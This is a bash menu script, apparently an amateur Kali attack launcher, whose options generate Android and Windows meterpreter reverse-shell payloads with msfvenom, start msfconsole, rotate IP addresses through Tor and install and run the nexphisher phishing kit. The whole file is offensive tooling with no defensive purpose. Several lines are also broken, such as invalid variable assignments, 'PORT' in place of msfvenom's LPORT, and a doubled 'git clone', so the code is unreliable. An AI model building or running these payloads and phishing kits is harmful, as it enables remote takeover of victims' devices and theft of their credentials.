#!/bin/bash 

echo "
                     ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
                     ||                                                                              ||  
                     ||                                                                              ||
                     ||    WRITTEN BY RAGHU   ///// GALAXY ............../////                       ||
                     ||                                                                              ||
                     ||                                                                              ||
                     ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
"

echo -e "\e[1;33;4;44mChoose Here:\e[0m"
echo -e "\e[1m1.Payload (Android and Windows)\e[0m"
echo -e "\e[1m2.IP_SPOOFING (Change ip address every five seconds)\e[0m" 
echo -e "\e[1m3.PHISHING\e[0m" 
echo -e "\e[1m4.UPDATE && SUPPORT\e[0m" 
echo -e "\e[1m5.EXIT\e[0m"

echo -e "\e[1;33;4;44mSelect Attack:\e[0m"
read a 
sleep 5
check_command() {
    if [ $? -ne 0 ]; then
        echo "Error: $1 failed to execute."
        exit 1
    fi
}

if [[ $a == 1 ]]; then
      echo $(clear)
      echo -e "\e[1;33;4;44mChoose Here:\e[0m"
      echo -e "\e[1m1.Android\e[0m"
      echo -e "\e[1m2.Windows\e[0m"
      echo -e "\e[1;33;4;44mSelect platform:\e[0m"
      read platform
      if [[ $platform == 1 ]]; then
            echo " 
                                                                     #
                                                                    # #    #    #  #####   #####    ####      #    #####
                                                                   #   #   ##   #  #    #  #    #  #    #     #    #    #
                                                                  #     #  # #  #  #    #  #    #  #    #     #    #    #
                                                                  #######  #  # #  #    #  #####   #    #     #    #    #
                                                                  #     #  #   ##  #    #  #   #   #    #     #    #    #
                                                                  #     #  #    #  #####   #    #   ####      #    #####

                                                 "
             echo -e "\e[1mENTER IP_ADDRESS:\e[0m"
             read ip
             echo -e "\e[1mENTER PORT:\e[0m"
             read port
             echo $(clear)
             echo -e "\e[31m+++++++++++++++++++++++++++++++++++++++++Generating Payload++++++++++++++++++++++++++++++++++++++++++++++++++++++=\e[0m"
             sleep 5
             payload = $(msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip PORT=$port -o /home/kali/Desktop/android1.apk)
             echo -e "\e[31m+++++++++++++++++++++++++++++++++++++++++Payload is Ready++++++++++++++++++++++++++++++++++++++++++++++++++++++=\e[0m"
             echo $(ls | grep android1.apk)
             echo $(mv android1.apk /Desktop)
             echo "Starting msfvenom..."
             sudo msfconsole
             check_command "msfconsole"     
             echo -e "\e[1;33;4;44mDescription:your payload in Desktop directory... start exploiting using metasploit use multi handler set lhost and  lport and exploit android........\e[0m"
              echo "bye"
                 

      elif [[ $platform == 2 ]]; then
              echo "                                          #     #
                                                              #  #  #     #    #    #  #####    ####   #    #   ####
                                                              #  #  #     #    ##   #  #    #  #    #  #    #  #
                                                              #  #  #     #    # #  #  #    #  #    #  #    #   ####
                                                              #  #  #     #    #  # #  #    #  #    #  # ## #       #
                                                              #  #  #     #    #   ##  #    #  #    #  ##  ##  #    #
                                                               ## ##      #    #    #  #####    ####   #    #   ####

                                              "
                                                                         
              
             echo -e "\e[1mENTER IP_ADDRESS:\e[0m"
             read ipp
             echo -e "\e[1mENTER PORT:\e[0m"
             read poort
             echo $(clear)
             echo -e "\e[31m+++++++++++++++++++++++++++++++++++++++++Generating Payload++++++++++++++++++++++++++++++++++++++++++++++++++++++=\e[0m"
             sleep 5
             payloads = $(msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ipp PORT=$poort -f EXE -o /home/kali/Desktop/exploit.exe)
             echo -e "\e[31m+++++++++++++++++++++++++++++++++++++++++Payload is Ready++++++++++++++++++++++++++++++++++++++++++++++++++++++=\e[0m"
             #echo $(ls | grep android1.apk)
             #echo $(mv android1.apk /Desktop)
                    
             echo -e "\e[1;33;4;44mDescription:your payload in Desktop directory... start exploiting using metasploit use multi handler set lhost and  lport and exploit android........\e[0m"
             echo "bye"
      else
                echo "bye"
                echo  $(exit)
     fi    



elif [[ $a == 2 ]]; then
         echo $(clear)
         echo 
             "                                                                                                     ###   ######           #####  #     #    #    #     #  #####  ####### ######
                                                                                                                    #    #     #         #     # #     #   # #   ##    # #     # #       #     #
                                                                                                                    #    #     #         #       #     #  #   #  # #   # #       #       #     #
                                                                                                                    #    ######          #       ####### #     # #  #  # #  #### #####   ######
                                                                                                                    #    #               #       #     # ####### #   # # #     # #       #   #
                                                                                                                    #    #               #     # #     # #     # #    ## #     # #       #    #
                                                                                                                   ###   #       #######  #####  #     # #     # #     #  #####  ####### #     #



         sleep                                                                                                                      "
         echo -e "\e[1mDownloading Packages.........................................\e[0m"
         echo -e "\e[1mPlease Wait...................................................\e[0m"
         sleep 4
         echo $(git clone https://github.com/FDX100/Auto_Tor_IP_changer.git)
         sleep 4
         echo $(cd Auto_Tor_IP_changer)
         sleep 3
         echo $(python install.py)
         sleep 3
         echo $(python autoTOR.py)
         echo -e "\e[1;33;4;44mDescription: connect the proxy to the browser........enter a options........ got to web site what is my ip refresh every 5 seconds your ip should changes continously\e[0m"
elif [[ $a == 3 ]]; then
       echo $(clear)
        echo "



                                                              ######
                                                              #     #  #    #     #     ####   #    #     #    #    #   ####
                                                              #     #  #    #     #    #       #    #     #    ##   #  #    #
                                                              ######   ######     #     ####   ######     #    # #  #  #
                                                              #        #    #     #         #  #    #     #    #  # #  #  ###
                                                              #        #    #     #    #    #  #    #     #    #   ##  #    #
                                                              #        #    #     #     ####   #    #     #    #    #   ####    
                                                                                                                                 " 

       sleep 3
       #echo $(apt install git -y)
       clone = $(git clone git clone git://github.com/htr-tech/nexphisher.git)
       echo $clone
       sleep 2
       echo $(cd nexphisher)
       sleep 2
       echo $(bash setup)
       sleep 2
       echo $(bash nexphisher)
elif [[ $a == 4 ]]; then
        echo $(apt update && apt upgrade)
        echo -e "\033[32m +++++++++++++++++++++++++++++Description+++++++++++++++++++++++++++++++++++++++++++\033[0m"
        echo -e "\033[32m thanks for using our tools. for more updates visit our github repsoitory and explore our new tools\033[0m"
        echo -e "\033[31m Developed by MR.X@#$\033[0m"
elif [[ $a == 5 ]]; then 
        echo $(exit)
fi
